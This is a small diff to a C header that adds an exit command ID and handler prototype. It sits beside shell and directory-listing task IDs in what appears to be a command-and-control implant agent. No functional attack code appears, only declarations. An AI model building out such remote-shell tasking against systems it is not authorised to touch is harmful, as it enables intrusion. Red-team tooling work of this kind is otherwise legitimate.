@@ -16,6 +16,7 @@
 // Task IDs
 #define SHELL_CMD       0x10  // 0x10 is what translator uses for shell! 0x54 was example.
 #define DIR_LIST        0x11
+#define EXIT_CMD        0x12
 
 // Function Prototypes
 BOOL routine(VOID);
@@ -23,5 +24,6 @@ BOOL commandDispatch(PParser response);
 BOOL handleGetTasking(PParser getTasking);
 BOOL executeShell(PParser taskParser);
 BOOL executeDir(PParser taskParser);
+BOOL executeExit(PParser taskParser);
 
 #endif // COMMAND_H
